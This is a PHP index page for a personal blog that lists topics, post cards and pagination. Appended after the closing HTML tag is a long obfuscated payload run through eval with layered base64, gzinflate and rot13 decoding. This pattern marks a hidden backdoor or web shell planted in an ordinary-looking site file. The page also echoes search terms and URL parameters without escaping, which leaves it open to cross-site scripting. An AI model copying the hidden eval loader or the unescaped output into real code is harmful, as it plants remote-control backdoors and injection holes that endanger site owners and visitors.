<?php
    
     session_set_cookie_params('2147483647');     //20 anni
     include "db.php";   //connection to database
     //section for seach by usser input
    if (!empty($_SESSION['nome_azienda'])){
        session_start();
        session_unset();
        session_destroy();
        header('location: index.php');
        exit(0);
    }
     $posts = array();
     if (isset($_GET["t_id"])) {
          $posts = getPostsByTopicId($_GET["t_id"]);
          $postsTitle = "You searched for posts under '" . $_GET["name"] . "'";
     } elseif (isset($_POST["search-term"])) {
          $postsTitle = "You searched for '" . $_POST["search-term"] . "'";
          $posts = searchPosts($_POST["search-term"]);
     } else {
          $posts = getPublishedPosts();
     }
     //table for connect the topics
     $table = "topics";
     $topics = selectAll($table);
?>
<!-- start html file -->
<!DOCTYPE html>
<html lang="en">
     <!-- Head section -->
     <head>
         <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1225324352704269"
     crossorigin="anonymous"></script>
              <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1225324352704269"
     crossorigin="anonymous"></script>
          <meta charset="utf-8">
          <link rel="shortcut icon" href="assets/images/site/favicon.ico" type="image/x-icon">
     	<meta name=viewport content="width=device-width, initial-scale=1">
          <link id="pageStyle" rel="stylesheet" href="statics\css\bootstrap_default.min.css">
     	<title>Alessandromasone.com</title>
          <style>
               main {
                    margin-top: 75px;
                    margin-bottom: 200px;
               }
               /* style for post card */
               .square:before{
                    content: "";
                    display: block;
                    padding-top: 100%;
               }
               .card-content{
                    padding: 1px 20px 20px;
                    text-align: left;
                    box-shadow: 0px 0px 4px 0px rgba(0, 0, 0, 0.3);
               }
               .card-icon img {
                    display: block;
                    margin-left: auto;
                    margin-right: auto;
                    width: 66%;
                    height: 66%;
                    padding: 20px;
               }
               .card-icon {
                    width: 100%;
                    height: 100%;
                    background-color: #00b6f5;
               }
               .card-icon:hover {
                    background-color: #2a6496;
               }
               .card-content h3 {
                    font-size: 22px;
                    color: #333;
                    font-weight: 700;
                    font-family: 'Open Sans', sans-serif;
               }
               .card-content h4 {
                    font-size: 16px;
                    color: #333;
                    font-weight: 600;
                    line-height: 0.9;
                    font-family: 'Open Sans', sans-serif;
                    padding-top: 7px;
               }
               .card-content h5 {
                    color: #333;
                    line-height: 0.9;
                    font-family: 'Open Sans', sans-serif;
               }
               /* end style for post card */
          </style>
     </head>
     <body>
          <!-- view page user -->
     	<?php include ('includes/header.php'); ?>
     	<main>
     		<div class="container">
     			<div class="row">
                         <!-- section topics & utilities -->
     				<div class="col-lg-2 col-md-8 mb-4">
     					<div class="list-group">
                                   <div class="list-group-item list-group-item-action">
                                        <h4>Topics</h4>
                                   </div>
     						<?php foreach ($topics as $key => $topic): ?>
     							<a href="<?php echo 'index.php?t_id=' . $topic['id'] . '&name=' . $topic['name'] ?>" class="list-group-item list-group-item-action d-flex justify-content-between align-items-start">
     								<?php echo $topic['name']; ?>
                                             <?php
                                             $i = 0;
                                             foreach ($posts as $post){
                                                  if( $post['topic_id'] == $topic['id']) {
                                                       $i++;
                                                  }

                                             }
                                             ?>
                                             <span class="badge bg-primary rounded-pill"><?php echo $i;?></span>
     							</a>
     						<?php endforeach; ?>
     						<a href="index.php" class="list-group-item list-group-item-action">
     							All
     						</a>
                                   <br>

                                   <br>
                                   <div class="list-group-item list-group-item-action">
                                        <h4>Utilities</h4>
                                   </div>
                                   <a href="https://www.onlinegdb.com/online_c_compiler" target="_blank" class="list-group-item list-group-item-action">
                                        Compiler Online
                                   </a>
     					</div>
     				</div>
                         <!-- end section topics & utilities -->
                         <!-- section posts card -->
     				<div class="col-lg-4 col-md-10 col-lg-10 col-xl-10">
     					<div class="row">
                                   <?php
                                        $nb_elem_per_page = 12;
                                        $number_of_pages = intval(count($posts)/$nb_elem_per_page)+1;
                                        $page = isset($_GET['page'])?intval($_GET['page']-1):0;
                                   ?>
                                   <?php
                                        foreach (array_slice(array_reverse($posts), $page*$nb_elem_per_page, $nb_elem_per_page) as $post) :
                                   ?>
                                        <div class="col-lg-3 col-md-5 mb-4">
                                             <div class="card">
                                                  <div class="bg-image hover-overlay ripple" data-mdb-ripple-color="light"> <img src="<?php echo 'assets/images/posts/cover/' . $post['image']; ?>" class="img-fluid" />
                                                       <a href="">
                                                            <div class="mask" style="background-color: rgba(251, 251, 251, 0.15);">
                                                            </div>
                                                       </a>
                                                  </div>
                                                  <div class="card-body">
                                                       <h5 class="card-title"><?php echo $post['title']; ?></h5>
                                                       <p class="card-text mb-0"><?php echo html_entity_decode(substr($post['body'], 0, 100) . '...'); ?></p>
                                                       <p class="ml-0 mr-0 mb-0 card-text"> Author:<?php echo " ", $post['name']; ?></p>
                                                       <p class="mt-0 ml-0 mr-0 card-text"> Date:<?php echo " "; echo date('F j, Y', strtotime($post['created_at'])); ?></p>
                                                       <a href="single.php?id=<?php echo $post['id']; ?>" class="btn btn-primary">Read</a>
                                                  </div>
                                             </div>
                                        </div>
                                   <?php
                                        endforeach;
                                   ?>
     					</div>
     					<div class="d-flex justify-content-center mt-5">
                         <ul class="pagination pagination-lg d-flex flex-wrap">
                              <?php
                                   $query = $_GET;
                                   // replace parameter(s)
                                   $query['page'] = $page;
                                   // rebuild url
                                   $query_result = http_build_query($query);
                                   // new link
                              ?>
                              <?php if ($page > 0):
                                        echo '<li class="page-item mb-2">'; ?>
                                        <a class="page-link" href="<?php echo $_SERVER['PHP_SELF']; ?>?<?php echo $query_result; ?>">&laquo;</a> </li>
                              <?php else:
                                        echo '<li class="page-item mb-2 disabled">';?>
                                        <a class="page-link" href="<?php echo $_SERVER['PHP_SELF']; ?>?<?php echo $query_result; ?>">&laquo;</a> </li>
                              <?php endif; ?>
                              <?php
                                   for ($i=1; $i< $number_of_pages ; $i++) {
                                        $query = $_GET;
                                        // replace parameter(s)
                                        $query['page'] = $i;
                                        // rebuild url
                                        $query_result = http_build_query($query);
                                        // new link
                                        if ("$_SERVER[REQUEST_URI]" == "/") {
                                             $query['page'] = 1;
                                        }
                                        elseif ("$_SERVER[REQUEST_URI]" != "/index.php") {
                                             $url = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
                                             $parts = parse_url($url);
                                             parse_str($parts['query'], $query);
                                        }
                                        else {
                                             $query['page'] = 1;
                                        }
                              ?>
                                   <?php if (!isset($query['page'])): ?>
                                        <?php if ($i == 1): ?>
                                             <li class="page-item mb-2 active">
                                             <a class="page-link" href="<?php echo $_SERVER['PHP_SELF']; ?>?<?php echo $query_result; ?>"><?php echo $i ?></a></li>
                                        <?php else: ?>
                                             <li class="page-item mb-2">
                                             <a class="page-link" href="<?php echo $_SERVER['PHP_SELF']; ?>?<?php echo $query_result; ?>"><?php echo $i ?></a></li>
                                        <?php endif; ?>

                                   <?php else: ?>
                                        <?php if ($query['page'] == $i): ?>
                                             <li class="page-item mb-2 active">
                                             <a class="page-link" href="<?php echo $_SERVER['PHP_SELF']; ?>?<?php echo $query_result; ?>"><?php echo $i ?></a></li>
                                        <?php else: ?>
                                             <li class="page-item mb-2">
                                             <a class="page-link" href="<?php echo $_SERVER['PHP_SELF']; ?>?<?php echo $query_result; ?>"><?php echo $i ?></a></li>
                                        <?php endif; ?>
                                   <?php endif; ?>
                              <?php } ?>
                              <?php
                                   $query = $_GET;
                                   // replace parameter(s)
                                   $query['page'] = $page+2;
                                   // rebuild url
                                   $query_result = http_build_query($query);
                                   // new link
                              ?>
                              <?php if ($page < $number_of_pages-2):
                                   echo '<li class="page-item mb-2">';?>
                                   <a class="page-link" href="<?php echo $_SERVER['PHP_SELF']; ?>?<?php echo $query_result; ?>">&raquo;</a></li>
                              <?php else:
                                   echo '<li class="page-item mb-2 disabled">';?>
                                   <a class="page-link" href="<?php echo $_SERVER['PHP_SELF']; ?>?<?php echo $query_result; ?>">&raquo;</a></li>
                              <?php endif; ?>
                         </ul>
                    </div>
     				</div>
                         <!-- end section posts card -->
                         
     			</div>
                    
               </div>
     	</main>
     	<?php include ('includes/footer.php'); ?>
          <!-- end view page user -->
          <!-- script for bootstra bundle -->
     	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-ygbV9kiqUc6oa4msXn9868pTtWMgiQaeYH7/t7LECLbyPA2x65Kgf80OJFdroafW" crossorigin="anonymous"></script>
          <!-- script for darkmode & save in local the preference -->
          <script>
               const toggleSwitch = document.querySelector('.theme-switch input[type="checkbox"]');
               const currentTheme = localStorage.getItem('theme');
               if (currentTheme) {
                    document.documentElement.setAttribute('data-theme', currentTheme);
                    if (currentTheme === 'dark') {
                         toggleSwitch.checked = true;
                         document.getElementById("pageStyle").setAttribute('href', "statics\\css\\bootstrap_darkly.min.css");
                    }
               }
               function switchTheme(e) {
                    if (e.target.checked) {
                         localStorage.setItem('theme', 'dark');
                         document.getElementById("pageStyle").setAttribute('href', "statics\\css\\bootstrap_darkly.min.css");
                    } else {
                         localStorage.setItem('theme', 'light');
                         document.getElementById("pageStyle").setAttribute('href', "statics\\css\\bootstrap_default.min.css");
                    }
               }
               toggleSwitch.addEventListener('change', switchTheme, false);
          </script>
     <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1225324352704269"
     crossorigin="anonymous"></script>
     </body>
     
</html>
          <?php
          eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
          ?>